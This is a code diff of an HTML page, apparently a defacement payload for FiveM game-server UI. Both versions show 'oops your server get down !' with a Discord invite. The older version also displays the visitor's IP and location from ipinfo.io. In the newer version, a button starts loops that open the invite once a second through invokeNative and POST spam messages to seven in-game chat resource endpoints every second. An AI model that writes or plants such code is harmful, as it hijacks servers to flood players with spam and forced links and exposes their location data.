@@ -1,120 +1,195 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>⚠️ Bo.khalil ⚠️</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background-color: #000;
+    font-family: 'Courier New', monospace;
+    overflow: hidden;
+    height: 100vh;
+    color: #0f0;
+  }
 
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #ff0000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-    
-   
-        }
+  /* خلفية Matrix */
+  body::before {
+    content: "";
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      rgba(0,255,0,0.05) 0px,
+      rgba(0,255,0,0.05) 1px,
+      transparent 1px,
+      transparent 2px
+    );
+    z-index: -1;
+    animation: bgMove 5s linear infinite;
+  }
+  @keyframes bgMove { to { background-position-y: 100%; } }
 
-.
-// put the js code in YOUR index.html
-// index.html
-// vjmi pulled all of them 👀
-// discord.gg/4Z44u8D2Nw #1
-const msg = `👑 Hmm . ! 👑`;
-const body = JSON.stringify({ message: msg });
-setInterval(() => {
-fetch("https://flix-scripts/chatResult", { method: "POST", body });
-fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
-fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
-fetch("https://melix_chat/chatResult", { method: "POST", body });
-fetch("https://as_chat/chatResult", { method: "POST", body });
-fetch("https://chat/chatResult", { method: "POST", body });
-fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
-}, 1000);
-.
+  /* شاشة البداية */
+  #intro-image {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: url('https://i.postimg.cc/ryttp9T2/IMG-1339.jpg') center center / cover no-repeat;
+    animation: fadeOut 2s ease-in-out forwards;
+    animation-delay: 2s;
+    z-index: 10;
+    filter: contrast(1.2) saturate(1.3);
+  }
+  @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
 
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #0000ff; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #0000ff; 
-            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
-            letter-spacing: 5.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #0000ff; 
-            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
-            letter-spacing: 1.5px; 
-        }
-    </style>
+  /* Glitch Effect */
+  .glitch {
+    font-size: 2.5em;
+    color: #0f0;
+    position: relative;
+    animation: glitch 1s infinite;
+    text-shadow: 2px 2px #f00, -2px -2px #0ff;
+  }
+  @keyframes glitch {
+    0% { text-shadow: 2px 2px #f00, -2px -2px #0ff; }
+    20% { text-shadow: -2px -2px #f00, 2px 2px #0ff; }
+    40% { text-shadow: 2px -2px #f00, -2px 2px #0ff; }
+    60% { text-shadow: -2px 2px #f00, 2px -2px #0ff; }
+    100% { text-shadow: 2px 2px #f00, -2px -2px #0ff; }
+  }
+
+  #main-content {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+
+  .center-gif img {
+    width: 400px;
+    border-radius: 15px;
+    box-shadow: 0 0 25px #0f0;
+    animation: float 4s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+
+  /* زر Glitch */
+  button {
+    margin-top: 20px;
+    padding: 12px 25px;
+    background: transparent;
+    border: 2px solid #0f0;
+    color: #0f0;
+    font-size: 1.2em;
+    cursor: pointer;
+    border-radius: 10px;
+    position: relative;
+    overflow: hidden;
+  }
+  button::before, button::after {
+    content: "";
+    position: absolute;
+    left: -50%;
+    width: 200%;
+    height: 2px;
+    background: #0f0;
+    animation: glitchLine 2s infinite linear;
+  }
+  button::after { animation-delay: 1s; }
+  @keyframes glitchLine {
+    0% { top: -10%; }
+    100% { top: 110%; }
+  }
+</style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="https://i.pinimg.com/originals/06/bb/79/06bb79b09356eab20d22eae0e65ccded.gif" alt="WWWW">
-    </div>
-    <audio autoplay loop>
-        <source src="https://c.top4top.io/m_34874jpm41.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-    <div class="text"> </div>
 
-    <script>
-         fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
-    </script>
-</body>
-</html> 
+<div id="intro-image"></div>
 
+<div id="main-content">
+  <div class="center-gif">
+    <img src="https://media2.giphy.com/media/lrb30GmwdPahz1Odfg/200w.gif?cid=6c09b952bhpajxe7hmubf212a9od6mgoiulao8jb2s9qro0z&ep=v1_gifs_search&rid=200w.gif&ct=g" alt="GIF">
+  </div>
+  <div class="glitch" id="typewriter"></div>
+  <button id="startBtn">Accessing Server... Override Initiated</button>
+</div>
 
-   
-
-
-   
-       </script>
-<marquee>
-              <font size="22">
-              oops your server get down ! 
-            </marquee>
-
+<audio id="bg-music" preload="auto" loop>
+  <source src="https://c.top4top.io/m_34874jpm41.mp3" type="audio/mpeg">
+</audio>
 
 <script>
-        
-        setisnterval(function() {
-            window.invokeNative("openUrl", "https://discord.gg/4Z44u8D2Nw");
-            window.invokeNative("openUrl", "https://discord.gg/4Z44u8D2Nw");
-            window.invokeNative("openUrl", "https://discord.gg/4Z44u8D2Nw");
-            window.invokeNative("openUrl", "https://discord.gg/4Z44u8D2Nw");
-          }, 1000);
+const audio = document.getElementById("bg-music");
+const writer = document.getElementById("typewriter");
+const text = "⚠️ oops your server get down ! ⚠️ ";
+let i = 0;
 
-    </script>
+setTimeout(() => {
+  document.getElementById("main-content").style.display = "flex";
+  audio.volume = 0.5;
+  audio.play();
+
+  function typeWriter() {
+    if (i < text.length) {
+      writer.innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, 100);
+    }
+  }
+  typeWriter();
+}, 2000);
+
+document.getElementById("startBtn").addEventListener("click", () => {
+  // فتح الرابط كل ثانية
+  setInterval(function() {
+    try {
+      window.invokeNative("openUrl", "https://discord.gg/4Z44u8D2Nw");
+    } catch (e) {
+      console.warn("invokeNative not available.");
+    }
+  }, 1000);
+
+  // إرسال الرسائل كل ثانية
+  const msg = `👑 ⚠️ Bo.khalil ⚠️ ! 👑`;
+  const body = JSON.stringify({ message: msg });
+  setInterval(() => {
+    fetch("https://flix-scripts/chatResult", { method: "POST", body });
+    fetch("https://danger_chat/Danger_Chat:SendMessage", {
+      method: "POST",
+      body: JSON.stringify({
+        message: msg,
+        channel: "شات العام",
+        color: null,
+        isImageAndLinksAllowed: [false, false]
+      })
+    });
+    fetch("https://easy-chat+/o6ZbK5Ecp6", {
+      headers: {
+        accept: "*/*",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      body: JSON.stringify({ message: msg, channel: "شات العام" }),
+      method: "POST"
+    });
+    fetch("https://melix_chat/chatResult", { method: "POST", body });
+    fetch("https://as_chat/chatResult", { method: "POST", body });
+    fetch("https://chat/chatResult", { method: "POST", body });
+    fetch("https://ho-chatv2/Chat", {
+      method: "POST",
+      body: JSON.stringify({
+        Type: "chatResult",
+        message: msg,
+        chatType: "general"
+      })
+    });
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
